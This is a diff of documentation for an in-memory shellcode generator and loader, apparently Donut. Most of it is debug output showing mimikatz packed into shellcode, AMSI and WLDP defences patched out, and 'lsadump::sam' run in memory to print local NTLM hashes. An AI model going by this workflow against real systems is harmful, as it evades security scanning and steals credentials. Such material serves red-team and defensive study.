+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : HttpQueryInfoA         = FC7CC8D82764DFBF
+DEBUG: donut.c:892:build_instance(): Hash for mscoree.dll     : CorBindToRuntime       = 6F6432B588D39C8D
+DEBUG: donut.c:892:build_instance(): Hash for mscoree.dll     : CLRCreateInstance      = 2828FB8F68349704
+DEBUG: donut.c:892:build_instance(): Hash for ole32.dll       : CoInitializeEx         = 9752F1AA167F8E79
+DEBUG: donut.c:892:build_instance(): Hash for ole32.dll       : CoCreateInstance       = 8211344A519AF3BA
+DEBUG: donut.c:892:build_instance(): Hash for ole32.dll       : CoUninitialize         = FF0605E1258BEE44
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlEqualUnicodeString  = D5CEDA5C642834D7
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlEqualString         = A69EAF72442222A4
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlUnicodeStringToAnsiString = 4DBA40D90962E1D6
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlInitUnicodeString   = A1143A47656B2526
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlExitUserThread      = 62FF88CDC045477E
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlExitUserProcess     = E20BCE2C11E82C7B
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlCreateUnicodeString = A469294ED1E1D8DC
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlGetCompressionWorkSpaceSize = 61E26E7C5DD38D2C
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlDecompressBufferEx  = 145C8CF24F5EAF3E
+DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : NtContinue             = 12ACA3AD3CC20AF5
+DEBUG: donut.c:895:build_instance(): Setting number of API to 48
+DEBUG: donut.c:898:build_instance(): Setting DLL names to ole32;oleaut32;wininet;mscoree;shell32
+DEBUG: donut.c:941:build_instance(): Copying strings required to bypass AMSI
+DEBUG: donut.c:949:build_instance(): Copying strings required to bypass WLDP
+DEBUG: donut.c:960:build_instance(): Copying strings required to replace command line.
+DEBUG: donut.c:968:build_instance(): Copying strings required to intercept exit-related API
+DEBUG: donut.c:1018:build_instance(): Copying module data to instance
+DEBUG: donut.c:1024:build_instance(): Encrypting instance
+DEBUG: donut.c:1042:build_instance(): Leaving with error :  0
+DEBUG: donut.c:1210:build_loader(): Inserting opcodes
+DEBUG: donut.c:1248:build_loader(): Copying 29548 bytes of x86 + amd64 shellcode
+DEBUG: donut.c:1090:save_loader(): Saving instance 0000024E9DE90080 to file. 483718 bytes.
+DEBUG: donut.c:1061:save_file(): Entering.
+DEBUG: donut.c:1065:save_file(): Writing 483718 bytes of 0000024E9DE90080 to instance
+DEBUG: donut.c:1070:save_file(): Leaving with error :  0
+DEBUG: donut.c:1139:save_loader(): Saving loader as binary
+DEBUG: donut.c:1172:save_loader(): Leaving with error :  0
+DEBUG: donut.c:1540:DonutCreate(): Leaving with error :  0
   [ Instance type : Embedded
   [ Module file   : "mimikatz.exe"
   [ Entropy       : Random names + Encryption
@@ -661,158 +648,163 @@ DEBUG: donut.c:1306:DonutCreate(): Leaving.
   [ Target CPU    : x86+amd64
   [ AMSI/WDLP     : continue
   [ Shellcode     : "loader.bin"
-DEBUG: donut.c:1314:DonutDelete(): Entering.
-DEBUG: donut.c:1333:DonutDelete(): Leaving.
+DEBUG: donut.c:1556:DonutDelete(): Entering.
+DEBUG: donut.c:1562:DonutDelete(): Releasing memory for module.
+DEBUG: donut.c:1568:DonutDelete(): Releasing memory for configuration.
+DEBUG: donut.c:1574:DonutDelete(): Releasing memory for loader.
+DEBUG: donut.c:289:unmap_file(): Releasing compressed data.
+DEBUG: donut.c:294:unmap_file(): Unmapping input file.
+DEBUG: donut.c:299:unmap_file(): Closing input file.
+DEBUG: donut.c:1580:DonutDelete(): Leaving.
 </pre>
 
-<p>Pass the instance as a parameter to loader32.exe or loader64.exe (depending on the module) and it will run on the host system as if in a target environment.</p>
+<p>If successfully created, there should now be a file called "instance" in the same directory as the loader. Pass the instance file as a parameter to loader.exe which should also be in the same directory.</p>
 
 <pre>
-C:\hub\donut\>loader64 instance
+C:\hub\donut>loader instance
 Running...
-DEBUG: loader.c:109:MainProc(): Maru IV : F0B0F2EDFF5B0A90
-DEBUG: loader.c:112:MainProc(): Resolving address for VirtualAlloc() : D75920F405CAE1A
-DEBUG: loader.c:116:MainProc(): Resolving address for VirtualFree() : D9181C14D8267BF1
-DEBUG: loader.c:120:MainProc(): Resolving address for RtlExitUserProcess() : BBA9D25D742FFFBA
-DEBUG: loader.c:129:MainProc(): VirtualAlloc : 00007FFF7599A190 VirtualFree : 00007FFF7599A180
-DEBUG: loader.c:131:MainProc(): Allocating 483718 bytes of RW memory
-DEBUG: loader.c:143:MainProc(): Copying 483718 bytes of data to memory 0000018F047B0000
-DEBUG: loader.c:147:MainProc(): Zero initializing PDONUT_ASSEMBLY
-DEBUG: loader.c:156:MainProc(): Decrypting 483718 bytes of instance
-DEBUG: loader.c:163:MainProc(): Generating hash to verify decryption
-DEBUG: loader.c:165:MainProc(): Instance : C5B56D70E7049030 | Result : C5B56D70E7049030
-DEBUG: loader.c:172:MainProc(): Resolving LoadLibraryA
-DEBUG: loader.c:189:MainProc(): Loading ole32
-DEBUG: loader.c:189:MainProc(): Loading oleaut32
-DEBUG: loader.c:189:MainProc(): Loading wininet
-DEBUG: loader.c:189:MainProc(): Loading mscoree
-DEBUG: loader.c:189:MainProc(): Loading shell32
-DEBUG: loader.c:189:MainProc(): Loading dnsapi
-DEBUG: loader.c:193:MainProc(): Resolving 48 API
-DEBUG: loader.c:196:MainProc(): Resolving API address for 0819C096077AD66C
-DEBUG: loader.c:196:MainProc(): Resolving API address for DB38502679800297
-DEBUG: loader.c:196:MainProc(): Resolving API address for 0D75920F405CAE1A
-DEBUG: loader.c:196:MainProc(): Resolving API address for D9181C14D8267BF1
-DEBUG: loader.c:196:MainProc(): Resolving API address for 834C79B7969EDA8C
-DEBUG: loader.c:196:MainProc(): Resolving API address for EF0BA1BAD577692E
-DEBUG: loader.c:196:MainProc(): Resolving API address for 5835BC10745C1F7C
-DEBUG: loader.c:196:MainProc(): Resolving API address for 7333599008177E49
-DEBUG: loader.c:196:MainProc(): Resolving API address for 2868CEA85AAE96D6
-DEBUG: loader.c:196:MainProc(): Resolving API address for 224C5EA75166A509
-DEBUG: loader.c:196:MainProc(): Resolving API address for EBC25867667797AA
-DEBUG: loader.c:196:MainProc(): Resolving API address for 29046C83F75992CD
-DEBUG: loader.c:196:MainProc(): Resolving API address for 2D0266D6BCF829CB
-DEBUG: loader.c:196:MainProc(): Resolving API address for D6E6294A0A1541B4
-DEBUG: loader.c:196:MainProc(): Resolving API address for C66DECBF4383BCB2
-DEBUG: loader.c:196:MainProc(): Resolving API address for 2D734066297BBBE2
-DEBUG: loader.c:196:MainProc(): Resolving API address for 2A747549DA298E3D
-DEBUG: loader.c:196:MainProc(): Resolving API address for B5C796A33B10E407
-DEBUG: loader.c:196:MainProc(): Resolving API address for BC66A2B524CB0AE5
-DEBUG: loader.c:196:MainProc(): Resolving API address for F83CE6DD874644B4
-DEBUG: loader.c:196:MainProc(): Resolving API address for 1A51637CDB6FF143
-DEBUG: loader.c:196:MainProc(): Resolving API address for 8D8BBF0E36AF8C09
-DEBUG: loader.c:196:MainProc(): Resolving API address for B639F71AA8455E4D
-DEBUG: loader.c:196:MainProc(): Resolving API address for E27E1946D5913519
-DEBUG: loader.c:196:MainProc(): Resolving API address for 3C2B12AB58F87C74
-DEBUG: loader.c:196:MainProc(): Resolving API address for 35D897120CB371FF
-DEBUG: loader.c:196:MainProc(): Resolving API address for B397793CB6D5C517
-DEBUG: loader.c:196:MainProc(): Resolving API address for 06D445864AEE48BA
-DEBUG: loader.c:196:MainProc(): Resolving API address for F1AA68CD2B50BC01
-DEBUG: loader.c:196:MainProc(): Resolving API address for 38EFCB47B85EA4D5
-DEBUG: loader.c:196:MainProc(): Resolving API address for C24F502A68666494
-DEBUG: loader.c:196:MainProc(): Resolving API address for BBB1AAE646EE2F7D
-DEBUG: loader.c:196:MainProc(): Resolving API address for F6F19D9093F0C903
-DEBUG: loader.c:196:MainProc(): Resolving API address for 269C41D7AE739078
-DEBUG: loader.c:196:MainProc(): Resolving API address for C4C542975A41C8D7
-DEBUG: peb.c:87:FindExport(): c4c542975a41c8d7 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
+DEBUG: loader/loader.c:109:MainProc(): Maru IV : 546E2FF018FD2A54
+DEBUG: loader/loader.c:112:MainProc(): Resolving address for VirtualAlloc() : E445DF6F06219E85
+DEBUG: loader/loader.c:116:MainProc(): Resolving address for VirtualFree() : C6C992D6040B85A8
+DEBUG: loader/loader.c:120:MainProc(): Resolving address for RtlExitUserProcess() : E20BCE2C11E82C7B
+DEBUG: loader/loader.c:129:MainProc(): VirtualAlloc : 00007FFFD1DAA190 VirtualFree : 00007FFFD1DAA180
+DEBUG: loader/loader.c:131:MainProc(): Allocating 483718 bytes of RW memory
+DEBUG: loader/loader.c:143:MainProc(): Copying 483718 bytes of data to memory 00000178FEA30000
+DEBUG: loader/loader.c:147:MainProc(): Zero initializing PDONUT_ASSEMBLY
+DEBUG: loader/loader.c:156:MainProc(): Decrypting 483718 bytes of instance
+DEBUG: loader/loader.c:163:MainProc(): Generating hash to verify decryption
+DEBUG: loader/loader.c:165:MainProc(): Instance : 33C49D5864287AEF | Result : 33C49D5864287AEF
+DEBUG: loader/loader.c:172:MainProc(): Resolving LoadLibraryA
+DEBUG: loader/loader.c:189:MainProc(): Loading ole32
+DEBUG: loader/loader.c:189:MainProc(): Loading oleaut32
+DEBUG: loader/loader.c:189:MainProc(): Loading wininet
+DEBUG: loader/loader.c:189:MainProc(): Loading mscoree
+DEBUG: loader/loader.c:189:MainProc(): Loading shell32
+DEBUG: loader/loader.c:193:MainProc(): Resolving 48 API
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EF2C0663C0CDDC21
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for D40916771ECED480
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for E445DF6F06219E85
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for C6C992D6040B85A8
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 556BF46109D12C9E
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 032546126BB99713
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for DEB476FF0E3D71E8
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A0DD238846F064F4
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 03DE3865FC2DF17B
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 40FCB82879AAB610
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 954101E48C1D54F5
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 18669E0FDC3FD0B8
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EB6E7C47D574D9F9
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EFD410EF534D57C3
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A5AA007611CB6580
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for D5CEC16DD247A68A
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 6B140B7B87F27359
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for C2FA65C58C68FC6C
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for ED5A331176BB8DDA
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EA0D8BE258DC67DA
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 3A7BBDEAA1DC3354
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EEB92DFE18B7C306
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 687DD816E578C4E7
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for B0F95D86327741EC
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for BDD70375BB72B131
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for E74A4DD56C6B3154
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 527C502C0BC36267
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 055C3E8A4CF21475
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 4D1965E404D783BA
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for CC736E0143DB8F2A
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for C87BFE8578BB0049
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for FC7CC8D82764DFBF
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 6F6432B588D39C8D
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 2828FB8F68349704
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 9752F1AA167F8E79
+DEBUG: peb.c:87:FindExport(): 9752f1aa167f8e79 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
 DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
 DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
-DEBUG: loader.c:196:MainProc(): Resolving API address for 634BFF72C9EC1652
-DEBUG: peb.c:87:FindExport(): 634bff72c9ec1652 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 8211344A519AF3BA
+DEBUG: peb.c:87:FindExport(): 8211344a519af3ba is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
 DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
 DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
-DEBUG: loader.c:196:MainProc(): Resolving API address for 3E82DCFC01A0E510
-DEBUG: peb.c:87:FindExport(): 3e82dcfc01a0e510 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for FF0605E1258BEE44
+DEBUG: peb.c:87:FindExport(): ff0605e1258bee44 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
 DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
 DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
-DEBUG: loader.c:196:MainProc(): Resolving API address for CC36148EA324FE24
-DEBUG: loader.c:196:MainProc(): Resolving API address for 9817759202F29F6F
-DEBUG: loader.c:196:MainProc(): Resolving API address for B6F6C364E469845C
-DEBUG: loader.c:196:MainProc(): Resolving API address for DA51C8C9A172949A
-DEBUG: loader.c:196:MainProc(): Resolving API address for E12D5E33742A1ED0
-DEBUG: loader.c:196:MainProc(): Resolving API address for BBA9D25D742FFFBA
-DEBUG: loader.c:196:MainProc(): Resolving API address for DC6DC4EA65052019
-DEBUG: loader.c:196:MainProc(): Resolving API address for C8C7BFC1E7BC9A4B
-DEBUG: loader.c:196:MainProc(): Resolving API address for 44E1E1404E099395
-DEBUG: loader.c:196:MainProc(): Resolving API address for 611D823ADCDB9F62
-DEBUG: loader.c:218:MainProc(): Module is embedded.
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for D5CEDA5C642834D7
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A69EAF72442222A4
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 4DBA40D90962E1D6
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A1143A47656B2526
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 62FF88CDC045477E
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for E20BCE2C11E82C7B
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A469294ED1E1D8DC
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 61E26E7C5DD38D2C
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 145C8CF24F5EAF3E
+DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 12ACA3AD3CC20AF5
+DEBUG: loader/loader.c:218:MainProc(): Module is embedded.
 DEBUG: bypass.c:112:DisableAMSI(): Length of AmsiScanBufferStub is 36 bytes.
 DEBUG: bypass.c:122:DisableAMSI(): Overwriting AmsiScanBuffer
 DEBUG: bypass.c:137:DisableAMSI(): Length of AmsiScanStringStub is 36 bytes.
 DEBUG: bypass.c:147:DisableAMSI(): Overwriting AmsiScanString
-DEBUG: loader.c:226:MainProc(): DisableAMSI OK
+DEBUG: loader/loader.c:226:MainProc(): DisableAMSI OK
 DEBUG: bypass.c:326:DisableWLDP(): Length of WldpQueryDynamicCodeTrustStub is 20 bytes.
 DEBUG: bypass.c:350:DisableWLDP(): Length of WldpIsClassInApprovedListStub is 36 bytes.
-DEBUG: loader.c:232:MainProc(): DisableWLDP OK
-DEBUG: loader.c:239:MainProc(): Compression engine is 5
-DEBUG: loader.c:242:MainProc(): Allocating 1015240 bytes of memory for decompressed file and module information
-DEBUG: loader.c:252:MainProc(): Duplicating DONUT_MODULE
-DEBUG: loader.c:256:MainProc(): Decompressing 478726 -> 1013912
-DEBUG: loader.c:270:MainProc(): WorkSpace size : 1415999 | Fragment size : 5161
-DEBUG: loader.c:277:MainProc(): Decompressing with RtlDecompressBufferEx(XPRESS HUFFMAN)
-DEBUG: loader.c:302:MainProc(): Checking type of module
-DEBUG: inmem_pe.c:101:RunPE(): Allocating 1019904 (0xf9000) bytes of RWX memory for file
-DEBUG: inmem_pe.c:110:RunPE(): Copying Headers
-DEBUG: inmem_pe.c:113:RunPE(): Copying each section to RWX memory 0000018F04B90000
-DEBUG: inmem_pe.c:125:RunPE(): Applying Relocations
-DEBUG: inmem_pe.c:149:RunPE(): Processing the Import Table
-DEBUG: inmem_pe.c:157:RunPE(): Loading ADVAPI32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading Cabinet.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading CRYPT32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading cryptdll.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading DNSAPI.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading FLTLIB.DLL
-DEBUG: inmem_pe.c:157:RunPE(): Loading NETAPI32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading ole32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading OLEAUT32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading RPCRT4.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading SHLWAPI.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading SAMLIB.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading Secur32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading SHELL32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading USER32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading USERENV.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading VERSION.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading HID.DLL
-DEBUG: inmem_pe.c:157:RunPE(): Loading SETUPAPI.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading WinSCard.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading WINSTA.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading WLDAP32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading advapi32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading msasn1.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading ntdll.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading netapi32.dll
-DEBUG: inmem_pe.c:157:RunPE(): Loading KERNEL32.dll
-DEBUG: inmem_pe.c:180:RunPE(): Replacing KERNEL32.dll!ExitProcess with ntdll!RtlExitUserThread
-DEBUG: inmem_pe.c:157:RunPE(): Loading msvcrt.dll
-DEBUG: inmem_pe.c:180:RunPE(): Replacing msvcrt.dll!exit with ntdll!RtlExitUserThread
-DEBUG: inmem_pe.c:180:RunPE(): Replacing msvcrt.dll!_cexit with ntdll!RtlExitUserThread
-DEBUG: inmem_pe.c:180:RunPE(): Replacing msvcrt.dll!_exit with ntdll!RtlExitUserThread
-DEBUG: inmem_pe.c:194:RunPE(): Processing Delayed Import Table
-DEBUG: inmem_pe.c:202:RunPE(): Loading bcrypt.dll
-DEBUG: inmem_pe.c:202:RunPE(): Loading ncrypt.dll
-DEBUG: inmem_pe.c:317:RunPE(): Setting command line: CC6C lsadump::sam exit
-DEBUG: inmem_pe.c:436:SetCommandLineW(): Obtaining handle for kernelbase
-DEBUG: inmem_pe.c:452:SetCommandLineW(): Searching 2161 pointers
-DEBUG: inmem_pe.c:461:SetCommandLineW(): BaseUnicodeCommandLine at 00007FFF74179E60 : loader  ..\instance
-DEBUG: inmem_pe.c:469:SetCommandLineW(): New BaseUnicodeCommandLine at 00007FFF74179E60 : CC6C lsadump::sam exit
-DEBUG: inmem_pe.c:486:SetCommandLineW(): New BaseAnsiCommandLine at 00007FFF74179E70 : CC6C lsadump::sam exit
-DEBUG: inmem_pe.c:533:SetCommandLineW(): Setting ucrtbase.dll!__p__acmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
-DEBUG: inmem_pe.c:546:SetCommandLineW(): Setting ucrtbase.dll!__p__wcmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
-DEBUG: inmem_pe.c:533:SetCommandLineW(): Setting msvcrt.dll!_acmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
-DEBUG: inmem_pe.c:546:SetCommandLineW(): Setting msvcrt.dll!_wcmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
-DEBUG: inmem_pe.c:321:RunPE(): Wiping Headers from memory
-DEBUG: inmem_pe.c:330:RunPE(): Creating thread for entrypoint of EXE : 0000018F04C207F8
+DEBUG: loader/loader.c:232:MainProc(): DisableWLDP OK
+DEBUG: loader/loader.c:239:MainProc(): Compression engine is 5
+DEBUG: loader/loader.c:242:MainProc(): Allocating 1015240 bytes of memory for decompressed file and module information
+DEBUG: loader/loader.c:252:MainProc(): Duplicating DONUT_MODULE
+DEBUG: loader/loader.c:256:MainProc(): Decompressing 478726 -> 1013912
+DEBUG: loader/loader.c:270:MainProc(): WorkSpace size : 1415999 | Fragment size : 5161
+DEBUG: loader/loader.c:277:MainProc(): Decompressing with RtlDecompressBufferEx(XPRESS HUFFMAN)
+DEBUG: loader/loader.c:302:MainProc(): Checking type of module
+DEBUG: inmem_pe.c:103:RunPE(): Allocating 1019904 (0xf9000) bytes of RWX memory for file
+DEBUG: inmem_pe.c:112:RunPE(): Copying Headers
+DEBUG: inmem_pe.c:115:RunPE(): Copying each section to RWX memory 00000178FF170000
+DEBUG: inmem_pe.c:127:RunPE(): Applying Relocations
+DEBUG: inmem_pe.c:151:RunPE(): Processing the Import Table
+DEBUG: inmem_pe.c:159:RunPE(): Loading ADVAPI32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading Cabinet.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading CRYPT32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading cryptdll.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading DNSAPI.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading FLTLIB.DLL
+DEBUG: inmem_pe.c:159:RunPE(): Loading NETAPI32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading ole32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading OLEAUT32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading RPCRT4.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading SHLWAPI.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading SAMLIB.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading Secur32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading SHELL32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading USER32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading USERENV.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading VERSION.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading HID.DLL
+DEBUG: inmem_pe.c:159:RunPE(): Loading SETUPAPI.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading WinSCard.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading WINSTA.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading WLDAP32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading advapi32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading msasn1.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading ntdll.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading netapi32.dll
+DEBUG: inmem_pe.c:159:RunPE(): Loading KERNEL32.dll
+DEBUG: inmem_pe.c:182:RunPE(): Replacing KERNEL32.dll!ExitProcess with ntdll!RtlExitUserThread
+DEBUG: inmem_pe.c:159:RunPE(): Loading msvcrt.dll
+DEBUG: inmem_pe.c:182:RunPE(): Replacing msvcrt.dll!exit with ntdll!RtlExitUserThread
+DEBUG: inmem_pe.c:182:RunPE(): Replacing msvcrt.dll!_cexit with ntdll!RtlExitUserThread
+DEBUG: inmem_pe.c:182:RunPE(): Replacing msvcrt.dll!_exit with ntdll!RtlExitUserThread
+DEBUG: inmem_pe.c:196:RunPE(): Processing Delayed Import Table
+DEBUG: inmem_pe.c:204:RunPE(): Loading bcrypt.dll
+DEBUG: inmem_pe.c:204:RunPE(): Loading ncrypt.dll
+DEBUG: inmem_pe.c:319:RunPE(): Setting command line: MTFM lsadump::sam exit
+DEBUG: inmem_pe.c:433:SetCommandLineW(): Obtaining handle for kernelbase
+DEBUG: inmem_pe.c:449:SetCommandLineW(): Searching 2161 pointers
+DEBUG: inmem_pe.c:458:SetCommandLineW(): BaseUnicodeCommandLine at 00007FFFD1609E70 : loader  instance
+DEBUG: inmem_pe.c:466:SetCommandLineW(): New BaseUnicodeCommandLine at 00007FFFD1609E70 : MTFM lsadump::sam exit
+DEBUG: inmem_pe.c:483:SetCommandLineW(): New BaseAnsiCommandLine at 00007FFFD1609E60 : MTFM lsadump::sam exit
+DEBUG: inmem_pe.c:530:SetCommandLineW(): Setting ucrtbase.dll!__p__acmdln "loader  instance" to "MTFM lsadump::sam exit"
+DEBUG: inmem_pe.c:543:SetCommandLineW(): Setting ucrtbase.dll!__p__wcmdln "loader  instance" to "MTFM lsadump::sam exit"
+DEBUG: inmem_pe.c:530:SetCommandLineW(): Setting msvcrt.dll!_acmdln "loader  instance" to "MTFM lsadump::sam exit"
+DEBUG: inmem_pe.c:543:SetCommandLineW(): Setting msvcrt.dll!_wcmdln "loader  instance" to "MTFM lsadump::sam exit"
+DEBUG: inmem_pe.c:323:RunPE(): Wiping Headers from memory
+DEBUG: inmem_pe.c:332:RunPE(): Creating thread for entrypoint of EXE : 00000178FF2007F8
 
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
@@ -848,7 +840,7 @@ User : john
 
 RID  : 000003ea (1002)
 User : user
-  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+  Hash NTLM: 5835048ce94ad0564e29a924a03510ef
 
 RID  : 000003eb (1003)
 User : test
@@ -856,17 +848,17 @@ User : test
 mimikatz(commandline) # exit
 Bye!
 
-DEBUG: inmem_pe.c:336:RunPE(): Process terminated
-DEBUG: inmem_pe.c:347:RunPE(): Erasing 1019904 bytes of memory at 0000018F04B90000
-DEBUG: inmem_pe.c:351:RunPE(): Releasing memory
-DEBUG: loader.c:343:MainProc(): Erasing RW memory for instance
-DEBUG: loader.c:346:MainProc(): Releasing RW memory for instance
-DEBUG: loader.c:354:MainProc(): Returning to caller
+DEBUG: inmem_pe.c:338:RunPE(): Process terminated
+DEBUG: inmem_pe.c:349:RunPE(): Erasing 1019904 bytes of memory at 00000178FF170000
+DEBUG: inmem_pe.c:353:RunPE(): Releasing memory
+DEBUG: loader/loader.c:343:MainProc(): Erasing RW memory for instance
+DEBUG: loader/loader.c:346:MainProc(): Releasing RW memory for instance
+DEBUG: loader/loader.c:354:MainProc(): Returning to caller
 </pre>
 
 <p>Obviously you should be cautious with what files you decide to execute on your machine.</p>
 
-<h2 id="loader">Extending The Loader</h2>
+<h2 id="loader">12. Extending The Loader</h2>
 
 <p>Donut was never designed with modularity in mind, however, a new version in future will try to simplify the process of extending the loader, so that others can write their own code for it. Currently, simple changes to the loader can sometimes require lots of changes to the entire code base and this isn't really ideal. If for any reason you want to update the loader to include additional functionality, the following steps are required.</p>
 
